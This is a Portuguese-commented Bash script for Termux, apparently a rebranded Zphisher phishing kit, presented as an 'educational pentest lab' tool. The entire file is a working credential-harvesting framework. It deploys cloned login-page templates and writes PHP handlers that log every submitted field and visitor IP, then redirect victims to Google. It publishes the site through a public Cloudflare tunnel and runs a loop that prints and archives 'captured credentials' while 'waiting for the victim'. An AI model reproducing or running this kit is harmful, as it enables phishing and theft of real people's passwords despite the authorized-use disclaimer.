#!/data/data/com.termux/files/usr/bin/bash

# =====================================
# PS.Thumbnails - PeekSecurity
# Autor: Peek | @PeekSecurity
# GitHub: https://psecurity.github.io/PSecurity
# =====================================
# Ferramenta Educacional para Laboratório de Pentest - Versão 3.0
# Uso exclusivamente autorizado em ambientes controlados.
# =====================================

# ----------------------------- CONFIGURAÇÕES ----------------------------
HOST="127.0.0.1"
PORT="8080"
SITES_DIR=".sites"
WWW_DIR=".server/www"
SERVER_DIR=".server"
CAPTURE_DIR=".server/captures"
CONFIG_FILE=".config"
LOG_FILE="$SERVER_DIR/ps-phish.log"

# Cores neon / hacker
RESET="\033[0m"
BOLD="\033[1m"
DIM="\033[2m"
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
MAGENTA="\033[95m"
CYAN="\033[96m"
WHITE="\033[97m"
BG_RED="\033[101m"
BG_GREEN="\033[102m"
NEON_GREEN="\033[38;2;0;255;128m"
NEON_BLUE="\033[38;2;0;255;255m"
NEON_PURPLE="\033[38;2;255;0;255m"
ORANGE="\033[38;2;255;165;0m"

# ----------------------------- FUNÇÕES ESTÉTICAS --------------------------
banner() {
    clear
    echo -e "${ORANGE}"
    echo " ______      _     _     _               "
    echo "|___  /     | |   (_)   | |              "
    echo "   / / _ __ | |__  _ ___| |__   ___ _ __ "
    echo "  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|"
    echo " / /__| |_) | | | | \__ \ | | |  __/ |   "
    echo "/_____| .__/|_| |_|_|___/_| |_|\___|_|   "
    echo "      | |                                "
    echo "      |_|                ${GREEN}Version : 3.0${RESET}"
    echo -e "${CYAN}[+] Laboratório de Pentest - Uso autorizado apenas${RESET}"
    echo -e "${NEON_GREEN}════════════════════════════════════════════════════${RESET}\n"
}

small_banner() {
    clear
    echo -e "${ORANGE}"
    echo "  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄"
    echo "  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄"
    echo "  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${GREEN} 3.0${RESET}"
    echo ""
}

# ----------------------------- UTILITÁRIOS ---------------------------------
log_event() {
    echo -e "$(date +'%H:%M:%S') - $1" >> "$LOG_FILE"
}

die() {
    echo -e "\n${RED}[!] $1${RESET}"
    log_event "ERRO: $1"
    exit 1
}

check_termux() {
    if [[ ! -d /data/data/com.termux ]]; then
        die "Este script foi otimizado para Termux. Instale o Termux primeiro."
    fi
}

setup_dirs() {
    mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR" 2>/dev/null
    rm -rf "$WWW_DIR"/* 2>/dev/null
    touch "$LOG_FILE"
}

dependencies() {
    echo -e "${GREEN}[+] Verificando dependências...${RESET}"
    local deps=("php" "curl" "wget" "unzip" "jq")
    local missing=()
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Instalando: ${missing[*]}${RESET}"
        pkg update -y && pkg install -y "${missing[@]}" || die "Falha na instalação de dependências."
    else
        echo -e "${GREEN}[✓] Todas as dependências OK.${RESET}"
    fi
}

# ----------------------------- TÚNEIS ---------------------------------------
install_cloudflared() {
    if [[ -x "$SERVER_DIR/cloudflared" ]]; then
        echo -e "${GREEN}[✓] Cloudflared já instalado.${RESET}"
        return
    fi
    echo -e "${CYAN}[+] Baixando cloudflared...${RESET}"
    local arch=$(uname -m)
    local url=""
    case "$arch" in
        aarch64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        x86_64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        i686) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
        *) die "Arquitetura não suportada: $arch" ;;
    esac
    wget -q --show-progress -O "$SERVER_DIR/cloudflared" "$url" || die "Download falhou."
    chmod +x "$SERVER_DIR/cloudflared"
    echo -e "${GREEN}[✓] Cloudflared instalado.${RESET}"
}

get_cloudflared_url() {
    local log_file="$1"
    local timeout=20
    for ((i=1; i<=timeout; i++)); do
        if [[ -f "$log_file" ]]; then
            local url=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' "$log_file" | head -1)
            if [[ -n "$url" ]]; then
                echo "$url"
                return 0
            fi
        fi
        sleep 1
    done
    return 1
}

start_cloudflared() {
    echo -e "${CYAN}[+] Iniciando Cloudflared...${RESET}"
    "$SERVER_DIR/cloudflared" tunnel --url "http://$HOST:$PORT" --logfile "$SERVER_DIR/cf.log" > /dev/null 2>&1 &
    CF_PID=$!
    local tunnel_url=$(get_cloudflared_url "$SERVER_DIR/cf.log")
    if [[ -z "$tunnel_url" ]]; then
        die "Não foi possível obter URL do Cloudflared."
    fi
    echo "$tunnel_url" > "$SERVER_DIR/url.txt"
    echo -e "${GREEN}[✓] Túnel ativo: ${NEON_BLUE}$tunnel_url${RESET}"
}

start_localhost() {
    echo -e "${CYAN}[+] Modo Localhost: http://$HOST:$PORT${RESET}"
    echo "http://$HOST:$PORT" > "$SERVER_DIR/url.txt"
}

# ----------------------------- PHP E TEMPLATES -----------------------------
start_php_server() {
    echo -e "${CYAN}[+] Iniciando servidor PHP...${RESET}"
    cd "$WWW_DIR" || die "Diretório WWW inacessível."
    php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    if ! kill -0 $PHP_PID 2>/dev/null; then
        die "Falha ao iniciar PHP."
    fi
    cd - >/dev/null
}

deploy_template() {
    local site="$1"
    if [[ ! -d "$SITES_DIR/$site" ]]; then
        die "Template '$site' não encontrado."
    fi
    echo -e "${CYAN}[+] Implantando template: $site${RESET}"
    cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
    # ip.php padrão
    if [[ ! -f "$WWW_DIR/ip.php" ]]; then
        cat > "$WWW_DIR/ip.php" <<'EOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
file_put_contents("ip.txt", "IP: $ip - " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
?>
EOF
    fi
    # post.php padrão
    if [[ ! -f "$WWW_DIR/post.php" ]]; then
        cat > "$WWW_DIR/post.php" <<'EOF'
<?php
if ($_POST) {
    $data = "[" . date("Y-m-d H:i:s") . "] ";
    foreach ($_POST as $k => $v) $data .= ucfirst($k) . ": $v | ";
    file_put_contents("usernames.txt", $data . PHP_EOL, FILE_APPEND);
}
header("Location: https://www.google.com");
exit;
?>
EOF
    fi
}

# ----------------------------- MONITOR DE CAPTURAS --------------------------
monitor_capture() {
    echo -e "${GREEN}[+] Monitorando capturas (IP e credenciais)...${RESET}"
    echo -e "${YELLOW}    Pressione Ctrl+C para interromper.${RESET}\n"
    while true; do
        if [[ -f "$WWW_DIR/ip.txt" ]]; then
            echo -e "${BG_RED}${WHITE}[!] IP CAPTURADO${RESET}"
            cat "$WWW_DIR/ip.txt"
            cat "$WWW_DIR/ip.txt" >> "$CAPTURE_DIR/ip_$(date +%s).txt"
            rm -f "$WWW_DIR/ip.txt"
        fi
        if [[ -f "$WWW_DIR/usernames.txt" ]]; then
            echo -e "${BG_RED}${WHITE}[!] CREDENCIAIS CAPTURADAS${RESET}"
            cat "$WWW_DIR/usernames.txt"
            cat "$WWW_DIR/usernames.txt" >> "$CAPTURE_DIR/creds_$(date +%s).txt"
            rm -f "$WWW_DIR/usernames.txt"
        fi
        sleep 1
    done
}

# ----------------------------- MENUS ----------------------------------------
list_templates() {
    local templates=()
    if [[ -d "$SITES_DIR" ]]; then
        for d in "$SITES_DIR"/*/; do
            if [[ -d "$d" ]]; then
                templates+=("$(basename "$d")")
            fi
        done
    fi
    if [[ ${#templates[@]} -eq 0 ]]; then
        die "Nenhum template encontrado em $SITES_DIR"
    fi
    echo -e "${CYAN}═══════════════ TEMPLATES DISPONÍVEIS ═══════════════${RESET}"
    for i in "${!templates[@]}"; do
        printf "  ${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
        if [[ $(( (i+1) % 2 )) -eq 0 ]]; then echo; fi
    done
    echo -e "\n  ${RED}[0]${RESET} Sair"
    echo -ne "${YELLOW}➜ Escolha um template: ${RESET}"
    read -r choice
    if [[ "$choice" == "0" ]]; then
        exit 0
    elif [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#templates[@]} )); then
        SELECTED_TEMPLATE="${templates[$((choice-1))]}"
    else
        die "Opção inválida"
    fi
}

tunnel_menu() {
    echo -e "${CYAN}═══════════════ MÉTODO DE EXPOSIÇÃO ═══════════════${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público, recomendado)"
    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
    read -r tun
    case "$tun" in
        1) TUNNEL="localhost" ;;
        2) TUNNEL="cloudflared" ;;
        *) TUNNEL="cloudflared" ;;
    esac
}

# ----------------------------- LIMPEZA E SAÍDA -----------------------------
cleanup() {
    echo -e "\n${YELLOW}[!] Encerrando processos...${RESET}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    pkill -f "$SERVER_DIR/cloudflared" 2>/dev/null
    rm -f "$SERVER_DIR/cf.log" "$SERVER_DIR/url.txt" 2>/dev/null
    echo -e "${GREEN}[✓] Limpeza concluída.${RESET}"
    log_event "Sessão encerrada."
    exit 0
}

# ----------------------------- MAIN ----------------------------------------
main() {
    trap cleanup INT TERM
    check_termux
    banner
    dependencies
    setup_dirs
    install_cloudflared
    list_templates
    tunnel_menu
    deploy_template "$SELECTED_TEMPLATE"
    start_php_server
    case "$TUNNEL" in
        localhost) start_localhost ;;
        cloudflared) start_cloudflared ;;
    esac
    echo -e "\n${GREEN}[✓] Serviço rodando. URL(s):${RESET}"
    cat "$SERVER_DIR/url.txt" 2>/dev/null | while read url; do echo -e "    ${CYAN}$url${RESET}"; done
    echo -e "\n${NEON_PURPLE}🔍 Aguardando interação da vítima...${RESET}\n"
    monitor_capture
}

main
